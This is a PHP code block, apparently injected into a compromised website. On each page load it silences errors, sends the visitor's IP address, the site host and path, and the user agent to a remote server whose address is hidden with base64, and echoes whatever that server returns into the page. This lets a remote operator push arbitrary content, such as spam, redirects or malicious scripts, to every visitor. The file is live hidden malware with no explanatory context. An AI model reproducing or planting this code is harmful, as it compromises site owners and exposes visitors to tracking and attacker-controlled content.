









<?php 
//###==3==###
@ini_set("display_errors",false);@error_reporting(0);
if(!empty($_COOKIE["client_check"]) && empty($ibv)) { $ibv = $_COOKIE["client_check"];  echo $ibv;} elseif (empty($ibv)) {
if (strstr($_SERVER["HTTP_HOST"], "127.0")){$name = $_SERVER["SERVER_ADDR"];}else{$name = $_SERVER["HTTP_HOST"];}
$usera = isset($_SERVER["HTTP_USER_AGENT"])?urlencode($_SERVER["HTTP_USER_AGENT"]):"";
$url = "http://".base64_decode("NS40NC40Mi43Nw==")."/get.php?ip=".urlencode($_SERVER["REMOTE_ADDR"])."&d=".urlencode($name.$_SERVER["REQUEST_URI"])."&u=".$usera."&i=1&h=".md5("382e545137758dd7eb3a5a015658308b11");
if(function_exists("curl_init")) {
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, FALSE);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
$ibv = curl_exec($ch);$info = curl_getinfo($ch);if ($info["http_code"]!=200){$ibv="";}
curl_close($ch);
} elseif(ini_get("allow_url_fopen") == 1) {
$ibv = file_get_contents($url);
}

echo $ibv;
}
//###==3==###
?>